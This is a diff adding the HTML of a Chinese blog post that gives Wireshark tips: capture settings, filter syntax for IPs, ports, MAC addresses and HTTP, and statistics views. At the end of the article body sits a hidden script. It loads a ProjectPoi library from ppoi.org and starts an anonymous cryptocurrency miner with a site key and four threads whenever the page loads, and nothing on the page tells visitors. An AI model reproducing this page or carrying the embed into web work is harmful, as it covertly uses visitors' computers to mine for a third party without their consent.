@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+  <meta name="author" content="Damit 5">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="Wireshark使用技巧及数据包分析方法"/>
+  <meta property="og:description" content="纸上得来终觉浅，绝知此事要躬行。" />
+  <meta property="og:site_name" content="Damit5&#39;s Blog"/>
+  <meta property="og:type" content="article" />
+  <meta property="og:image" content="https://damit5.com"/>
+  
+    <link rel="alternate" href="/atom.xml" title="Damit5&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>Damit5's Blog</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/css/style.dark.css">
+
+  <!-- Google Analytics -->
+  
+
+</head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/background.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">Wireshark使用技巧及数据包分析方法</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/damit5/damit5.github.io">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:damit5@protonmail.com">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://damit5.github.io/AboutMe">
+                  
+                  AboutMe
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://damit5.github.io/Link">
+                  
+                  Friend Link
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By Damit 5</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2017-11-30</span>
+            <span class="time">16:55:04</span>
+          </span>
+          
+        </div>
+        <!-- Tags -->
+        
+          <div class="post-tags text-muted">
+            Tags: 
+
+<a class="tag" href="/tags/其他/">#其他</a>
+
+
+          </div>
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <script src="/assets/js/APlayer.min.js"> </script><div id="aplayer9" class="aplayer" style="margin-bottom: 20px;"></div>
+		<script>
+			new APlayer({
+				element: document.getElementById("aplayer9"),
+				narrow: false,
+				autoplay: true,
+				showlrc: 0,
+				music: {
+					title: "六月的雨",
+					author: "胡歌",
+					url: "https://damit5.github.io/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",
+					pic: "https://damit5.github.io/Music/233.jpg",
+				}
+			});
+		</script>
+<h4 id="Wireshark是一款图形界面的网络嗅探器，支持多种平台，是网络流量分析的利器。"><a href="#Wireshark是一款图形界面的网络嗅探器，支持多种平台，是网络流量分析的利器。" class="headerlink" title="Wireshark是一款图形界面的网络嗅探器，支持多种平台，是网络流量分析的利器。"></a>Wireshark是一款图形界面的网络嗅探器，支持多种平台，是网络流量分析的利器。</h4><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Wireshark是一款图形界面的网络嗅探器，支持多种平台，是网络流量分析的利器。它的创始人是Gerald Combs，前身是Ethereal，作为开源项目经过众多开发者的完善它已经成为使用量最大的安全工具之一</p>
+<a id="more"></a>
+<p>本文所使用的Wireshark是2.4.2版，可以到官网下载：</p>
+<p><img src="https://damit5.com/Picture/Wireshark%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95/1.png" alt="1"></p>
+<h4 id="官网"><a href="#官网" class="headerlink" title="官网"></a><a href="https://www.wireshark.org/" target="_blank" rel="external">官网</a></h4><h2 id="网络分析"><a href="#网络分析" class="headerlink" title="网络分析"></a>网络分析</h2><h4 id="0×00：只抓包头"><a href="#0×00：只抓包头" class="headerlink" title="0×00：只抓包头"></a>0×00：只抓包头</h4><p>在进行网络分析时往往只需要知道两个节点是不是能够联通，具体的传输信息并不重要，所以抓包的时候可以设置只抓包头，这样就大大减少了数据包的大小，有利于数据分析。</p>
+<p>设置方法：</p>
+<p><code>Capture（捕获）</code>–&gt;<code>Options（选项）</code>–&gt;<code>Snaplen（Snap长度）</code>。</p>
+<p>将这个值设置200以下就可以抓到所有网络层次的头信息了。</p>
+<p><img src="https://damit5.com/Picture/Wireshark%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95/2.png" alt="2"></p>
+<p>另外也可以直接点击任务栏里的快捷键，快速设置</p>
+<p><img src="https://damit5.com/Picture/Wireshark%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95/3.png" alt="3"></p>
+<h4 id="0×01：只抓必要的包"><a href="#0×01：只抓必要的包" class="headerlink" title="0×01：只抓必要的包"></a>0×01：只抓必要的包</h4><p>我们可以设置抓包的<code>filter</code>，只抓一些感兴趣的包。</p>
+<p>设置方法：</p>
+<p><code>Capture（捕获）</code>–&gt;<code>Options（选项）</code>–&gt;<code>Capture Filter（捕获过滤器）</code></p>
+<p><img src="https://damit5.com/Picture/Wireshark%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95/5.png" alt="5"></p>
+<p>或者直接在首页输入</p>
+<p><img src="https://damit5.com/Picture/Wireshark%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95/4.png" alt="4"></p>
+<p>在输入框里输入规则，然后点击开始即可，比如输入</p>
+<p><code>dst host 192.168.1.100</code></p>
+<p>捕获目标主机为 192.168.1.100 的数据包</p>
+<p>访问 <code>192.168.1.100</code> 就能得到我们想要的结果</p>
+<p><img src="https://damit5.com/Picture/Wireshark%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95/6.png" alt="6"></p>
+<h4 id="0×02：过滤"><a href="#0×02：过滤" class="headerlink" title="0×02：过滤"></a>0×02：过滤</h4><p>使用过滤规则进行数据包筛选是Wireshark最强大的功能之一，比如如果知道问题发生的具体协议就可以以协议名称过滤。使用协议过滤时要注意协议之间的依赖性，比如NFS共享挂载失败，问题可能发生在挂载所用的mount协议，也可能发生在mount之前的portmap协议。</p>
+<p><img src="https://damit5.com/Picture/Wireshark%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95/7.png" alt="7"></p>
+<p>然后就是IP+端口的方式，一个比较简单的方法就是可以在感兴趣的数据包上右键然后点击“追踪流”，就可以看到与这对ip和端口的全部通信。</p>
+<p>比如: <code>ip.addr == 192.168.1.100</code></p>
+<p><img src="https://damit5.com/Picture/Wireshark%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95/8.png" alt="8"></p>
+<p>也可以在相应的包上<code>右键</code>–&gt;<code>Apply as Filter（作为过滤器应用）</code>–&gt;<code>Selected（选中）</code>(<code>Prepare as Filter</code> 也是可以的)，Wireshark就可以自动生成相应的过滤规则。这里给出一些常用的规则。</p>
+<h5 id="过滤IP"><a href="#过滤IP" class="headerlink" title="过滤IP:"></a>过滤IP:</h5><p>IP源地址：<code>ip.src ==192.168.1.1</code></p>
+<p>IP目的地址：<code>ip.dst== 192.168.1.1</code></p>
+<p>IP地址（包括源和目的）：<code>ip.addr== 192.168.1.1</code></p>
+<h5 id="过滤端口："><a href="#过滤端口：" class="headerlink" title="过滤端口："></a>过滤端口：</h5><p>TCP端口：<code>tcp.port==80</code></p>
+<p>TCP目的端口：<code>tcp.dstport == 80</code></p>
+<p>TCP源端口：<code>tcp.srcport == 80</code></p>
+<p>UDP端口：<code>udp.port eq 15000</code></p>
+<p>TCP 1-80之间的端口：<code>tcp.port &gt;= 1 and tcp.port &lt;= 80</code></p>
+<h5 id="过滤协议："><a href="#过滤协议：" class="headerlink" title="过滤协议："></a>过滤协议：</h5><p><code>http、tcp、udp、arp、icmp、http、smtp、ftp、dns 等。</code></p>
+<h5 id="过滤MAC地址："><a href="#过滤MAC地址：" class="headerlink" title="过滤MAC地址："></a>过滤MAC地址：</h5><p>源MAC地址：<code>eth.src==A0:00:00:04:C5:84</code></p>
+<p>目的MAC地址：<code>eth.dst==A0:00:00:04:C5:84</code></p>
+<p>MAC地址（包括源和目的）：<code>eth.addr==A0:00:00:04:C5:84</code></p>
+<h5 id="过滤包长度："><a href="#过滤包长度：" class="headerlink" title="过滤包长度："></a>过滤包长度：</h5><p>整个UDP数据包：<code>udp.length==20</code></p>
+<p>TCP数据包中的IP数据包：<code>tcp.len&gt;=20</code></p>
+<p>整个IP数据包：<code>ip.len==20</code></p>
+<p>整个数据包：<code>frame.len==20</code></p>
+<h5 id="HTTP模式过滤："><a href="#HTTP模式过滤：" class="headerlink" title="HTTP模式过滤："></a>HTTP模式过滤：</h5><p>请求方法为GET：<code>http.request.method==“GET”</code></p>
+<p>请求方法为POST：<code>http.request.method==“POST”</code></p>
+<p>指定URI：<code>http.request.uri==“/img/logo-edu.gif”</code></p>
+<p>请求或相应中包含特定内容：<code>http contains “FLAG”</code></p>
+<h4 id="0×03：自动分析"><a href="#0×03：自动分析" class="headerlink" title="0×03：自动分析"></a>0×03：自动分析</h4><p>Wireshark有强大的统计分析功能，可以帮助分析人员快速统计出一些基本信息。比如点击<code>Analyze（分析）</code>–&gt;<code>Expert InfoComposite（专家信息）</code>，就可以看到数据包的中的一些不同级别的信息统计，包含重传次数、链接建立次数、网络错误等，在分析网络性能时这个功能很有作用。</p>
+<p><img src="https://damit5.com/Picture/Wireshark%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95/9.png" alt="9"></p>
+<p>单击<code>Statistics（统计）</code>–&gt;<code>TCPStream Graph（TCP流图形）</code>，可以生成一些统计图表，比如下图表示171到192的数据传输过程，水平线表示短暂的停止过程。</p>
+<p><img src="https://cdn.tuisec.win/full/upload/201711/619f02639e8203fa3dc45250b43e93d2.jpg" alt="1"></p>
+<p>此外还可以统计分层信息、网络会话列表、网络端点列表、ip地址统计列表、应用层数据包信息等。</p>
+<h4 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h4><p>按 <code>Ctrl+F</code> Wireshark也可以进行关键字搜索，选择“<code>Packet list</code>” 和 “<code>String</code>“后才可以搜索数据包中的内容，这样的搜索可以在<strong>CTF</strong>中也许会有意外收获。</p>
+<p><img src="https://damit5.com/Picture/Wireshark%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95/10.png" alt="10"></p>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><a href="https://paper.tuisec.win/detail/5d82491e73da9a2" target="_blank" rel="external">参考链接</a></h4><p>链接中含有<strong>wireshark解CTF</strong>、<strong>wireshark命令行版本</strong>、<strong>Python解析数据包</strong></p>
+
+<html>
+<head>
+<script>
+var script = document.createElement("script");
+script.type = "text/javascript";
+script.src = "https://ppoi.org/lib/projectpoi.min.js";
+script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
+document.getElementsByTagName("head")[0].appendChild(script);
+</script>
+</head>
+</html>
+
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
